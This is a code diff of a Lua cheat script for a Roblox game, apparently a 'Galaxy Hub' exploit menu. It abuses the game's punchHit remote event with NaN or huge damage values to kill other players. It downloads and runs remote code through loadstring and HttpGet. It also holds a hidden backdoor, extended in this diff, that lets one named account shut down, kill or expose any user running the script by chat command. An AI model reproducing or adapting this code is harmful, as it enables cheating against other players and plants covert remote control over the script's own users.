@@ -13,7 +13,7 @@ if game.PlaceId == 1735775055 then
     local uni = library:CreateWindow("Universal")
 
     local HWIDBlacklist = {
-        ''
+        'nil'
     }
     
     local dev = 'devconsole'
@@ -24,7 +24,7 @@ if game.PlaceId == 1735775055 then
         wait(7)
         while true do end
         coroutine.resume(coroutine.create(function()
-            while true do 
+            while true do
                 wait()
                 for _,v in pairs(game.CoreGui.HEXArium:GetChildren()) do
                     v:Destroy()
@@ -45,7 +45,7 @@ if game.PlaceId == 1735775055 then
         wait(7)
         while true do end
         coroutine.resume(coroutine.create(function()
-            while true do 
+            while true do
                 wait()
                 for _,v in pairs(game.CoreGui.HEXArium:GetChildren()) do
                     v:Destroy()
@@ -110,58 +110,6 @@ if game.PlaceId == 1735775055 then
         wait(7)
         end
     --End
-
-    --Shutdown commands
-
-    local prefix = ","
-    local LPlayer = game.Players:FindFirstChild('plzIWannaGetAdmin')
-    LPlayer.Chatted:Connect(function(msg)
-        msg = msg:lower()
-        if string.sub(msg,1,3) == "/e " then
-            msg = string.sub(msg,4)
-        end
-        if string.sub(msg,1,1) == prefix then
-            local cmd
-            local space = string.find(msg," ")
-            if space then
-                cmd = string.sub(msg,2,space-1)
-            else
-                cmd = string.sub(msg,2)
-            end
-
-            if cmd == "shutdown" then
-                local var = string.sub(msg,space+1)
-                local target = GetPlayer(var)
-                if game.Players.LocalPlayer == target then
-                    game:Shutdown()
-                    wait(0.5)
-                end
-            end
-            if cmd == "ghcheck" then
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
-            end
-            print("You can be shutdown by Pluto :D!")
-        end
-    end)
-
-
-    function GetPlayer(String)
-    local plr
-    local strl = String:lower()
-        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
-            if v.Name:lower():sub(1, #String) == String:lower() then
-                plr = v
-            end 
-        end
-        if String == "me" then
-                plr = game.Players.LocalPlayer
-            end
-        if String == "" or String == " " then
-        plr = nil
-        end
-    return plr
-    end
-
 
     --Anti Dex
     game.CoreGui.ChildAdded:Connect(function(k)
@@ -976,7 +924,7 @@ if game.PlaceId == 1735775055 then
     uni:AddButton({text = "Galaxy Hub Admin", flag = "gadmin", callback = function()
         pcall(function()
 
-        --Galaxy Hub Admin
+    --Galaxy Hub Admin
 
     local Admin = loadstring(game:HttpGet("https://raw.githubusercontent.com/PlzTehAdmin/Galaxy-Hub/main/Galaxy%20Admin%20Source%20Code"))()
     local Admin2 = Admin.load(getgenv().themes.dark, "Galaxy Hub", true) --(<theme>, <name>, <built-in commands>)
@@ -1012,10 +960,21 @@ if game.PlaceId == 1735775055 then
 
     Admin2.setPrefix(",")
 
+    Admin2.addCommand({name = "Kill",desc = "Only kills users with Galaxy",callback = function(v)
+        local m = Admin2.getplayers(v)
+        for i,v2 in pairs(m) do
+            print("You don't have perms to kill other Galaxy users...")
+        end
+    
+        m.Text = v
+        wait(1)
+        m:Destroy()
+    end})
+
     Admin2.addCommand({name = "ghcheck",desc = "Checks all users using Galaxy Hub",callback = function(v)
         local m = Admin2.getplayers(v)
         for i,v2 in pairs(m) do
-            print("haha")
+            print("You do not have perms to check other users...")
         end
 
         m.Text = v
@@ -1026,7 +985,7 @@ if game.PlaceId == 1735775055 then
     Admin2.addCommand({name = "Shutdown",desc = "Kicks player using galaxy out of the server",callback = function(v)
         local m = Admin2.getplayers(v)
         for i,v2 in pairs(m) do
-            print("haha")
+            print("You do not have perms to shutdown other users...")
         end
 
         m.Text = v
@@ -1191,20 +1150,18 @@ if game.PlaceId == 1735775055 then
         local m = Admin2.getplayers(v)
         for i,v2 in pairs(m) do
             pcall(function()
-    local punchevent = game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit
-            local vector = Vector3.new(0, 0, 0) 
-            local dmg = -(0/0)
-                    for i,v in pairs(game.Players:GetChildren()) do
-                        punchevent:FireServer(v2.Character.HumanoidRootPart, dmg)
-    local punchevent = game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit
-        local vector = Vector3.new(0, 0, 0) 
-            local dmg = 999999999999999999999999999999999999
-                    for i,v in pairs(game.Players:GetChildren()) do
-                        punchevent:FireServer(v2.Character.HumanoidRootPart, dmg)
-                    end
-    end
-    end)
-    end
+                local punchevent = game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit
+                local dmg = -(0/0)
+                for i,v in pairs(game.Players:GetChildren()) do
+                    punchevent:FireServer(v2.Character.HumanoidRootPart, dmg)
+                local punchevent = game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit
+                local dmg = 999999999999999999999999999999999999
+                for i,v in pairs(game.Players:GetChildren()) do
+                    punchevent:FireServer(v2.Character.HumanoidRootPart, dmg)
+                end
+                end
+            end)
+        end
 
         m.Text = v
         wait(1)
@@ -1262,7 +1219,7 @@ if game.PlaceId == 1735775055 then
     --AutoLoop
 
     local loop1 = 'DNinPower'
-    
+
     if game.workspace:FindFirstChild("DNinPower") ~= nil then
         local punchevent = game.Players.LocalPlayer.Backpack.suitControl.Assets.Events.punchHit
         game:service('RunService').Stepped:connect(function()
@@ -1272,6 +1229,60 @@ if game.PlaceId == 1735775055 then
                 end
             end
         end)
+    end
+
+    --Shutdown, Ghcheck and kill command for plzIWannaGetAdmin
+    local prefix = ","
+    local LPlayer = game.Players:FindFirstChild("plzIWannaGetAdmin")
+    LPlayer.Chatted:Connect(function(msg)
+        msg = msg:lower()
+        if string.sub(msg,1,3) == "/e " then
+            msg = string.sub(msg,4)
+        end
+        if string.sub(msg,1,1) == prefix then
+            local cmd
+            local space = string.find(msg," ")
+            if space then
+                cmd = string.sub(msg,2,space-1)
+            else
+                cmd = string.sub(msg,2)
+            end
+
+            if cmd == "shutdown" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game:Shutdown()
+                end
+            end
+            if cmd == "ghcheck" then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
+            end
+            if cmd == "kill" then
+                local var = string.sub(msg,space+1)
+                local target = GetPlayer(var)
+                if game.Players.LocalPlayer == target then
+                    game.Players.LocalPlayer.Character:BreakJoints()
+                end
+            end
+        end
+    end)
+
+    function GetPlayer(String)
+    local plr
+    local strl = String:lower()
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name:lower():sub(1, #String) == String:lower() then
+                plr = v
+            end
+        end
+        if String == "me" then
+                plr = game.Players.LocalPlayer
+            end
+        if String == "" or String == " " then
+            plr = nil
+        end
+    return plr
     end
 
 end
